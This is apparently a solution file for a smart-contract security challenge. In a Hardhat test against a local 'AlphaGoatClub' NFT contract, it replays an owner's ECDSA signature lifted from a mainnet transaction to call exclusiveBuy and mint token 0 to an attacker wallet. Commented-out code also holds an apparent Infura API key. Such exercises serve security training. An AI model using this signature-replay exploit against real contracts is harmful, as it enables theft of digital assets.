const { loadFixture, mine } = require("@nomicfoundation/hardhat-network-helpers");
const { expect } = require("chai");
const { ethers } = require("hardhat");

const NAME = "Alpha Goat Club";

describe(NAME, function () {
    async function setup() {
        const [, attacker] = await ethers.getSigners();

        const AlphaGoatClub = await (await ethers.getContractFactory("AlphaGoatClubPrototypeNFT")).deploy();

        return {
            attacker,
            AlphaGoatClub,
        };
    }

    describe("exploit", async function () {
        let attacker, AlphaGoatClub;

        before(async function () {
            ({ attacker, AlphaGoatClub } = await loadFixture(setup));
        });

        it("conduct your attack here", async function () {
            // Your exploit here
            /**
             * The goal is to use the attacker wallet to mint the NFT at index 0 to itself.
             */
            console.log("signer:", await AlphaGoatClub.owner());

            // const infuraProvider = ethers.getDefaultProvider(
            //     'mainnet',
            //     { infura: 'f64a1f26acf7432287e2283e33714ca3' }
            // );
            // const txHash = '0x925b5905c877b2bea1453996a4e5980f9bfbba1abbd07b469a79d8ccf97931d3';
            // const tx = await infuraProvider.getTransaction(txHash);

            // console.log("sender:", tx.from);
            // console.log("tx.type:", tx.type);
            // const txData = {
            //     // nonce: ethers.BigNumber.from(tx.nonce).toHexString(),
            //     nonce: ethers.utils.hexlify(tx.nonce),
            //     // gasPrice: ethers.BigNumber.from(tx.gasPrice).toHexString(),
            //     gasPrice: ethers.utils.hexlify(tx.gasPrice),
            //     // gasLimit: ethers.BigNumber.from(tx.gasLimit).toHexString(),
            //     gasLimit: ethers.utils.hexlify(tx.gasLimit),
            //     to: tx.to,
            //     // value: ethers.BigNumber.from(tx.value).toHexString(),
            //     value: ethers.utils.hexlify(tx.value),
            //     data: tx.data,
            //     chainId: tx.chainId,
            //     type: tx.type,
            //     maxPriorityFeePerGas: ethers.utils.hexlify(tx.maxPriorityFeePerGas),
            //     maxFeePerGas: ethers.utils.hexlify(tx.maxFeePerGas)
            // };

            // const r = tx.r;
            // const s = tx.s;
            // const v = tx.v;

            // console.log("r:", r);
            // console.log("s:", s);
            // console.log("v:", v);

            // const serializedTx = ethers.utils.serializeTransaction(txData, { v, r, s });
            // const recomputedTxHash = ethers.utils.keccak256(serializedTx);
            // console.log("recomputedTxHash:", recomputedTxHash);

            const r = '0x570ea1569ef7f9e626f8250714e64cbd8ae7d65b4f705cd5aac0944060b4b6f6';
            const s = '0x084c010653e69d5ef453c0dda858076fe39fbb19bc40c41434f9ca9751d79238';
            const v = 1;

            // const rsTx = await ethers.utils.resolveProperties(txData)
            // const rawTx = ethers.utils.serializeTransaction(txData)
            const rawTx = "0x02ef018202b98607cbb0f489248607cbb0f4892482520894d77fc6ca9a55e0e2136e43d17ddbdc76a6e48dc4822ee080c0";
            console.log("rawTx:", rawTx);
            const msgHash1 = ethers.utils.hashMessage(ethers.utils.arrayify(rawTx));
            console.log("msgHash1:", msgHash1);
            const msgHash = ethers.utils.keccak256(rawTx);
            // const msgBytes = ethers.utils.arrayify(msgHash);
            console.log("msgHash:", msgHash);
            const signature = ethers.utils.joinSignature({ v, r, s });
            const recoveredAddress = ethers.utils.recoverAddress(msgHash, signature);
            console.log("recoveredAddress", recoveredAddress);

            await AlphaGoatClub
                .connect(attacker)
                .commit();

            await mine(5);

            await AlphaGoatClub
                .connect(attacker)
                .exclusiveBuy(0, msgHash, signature);
        });

        after(async function () {
            expect(await AlphaGoatClub.ownerOf(0)).to.equal(attacker.address);

            expect(await ethers.provider.getTransactionCount(attacker.address)).to.lessThan(
                3,
                "must exploit in two transactions or less"
            );
        });
    });
});
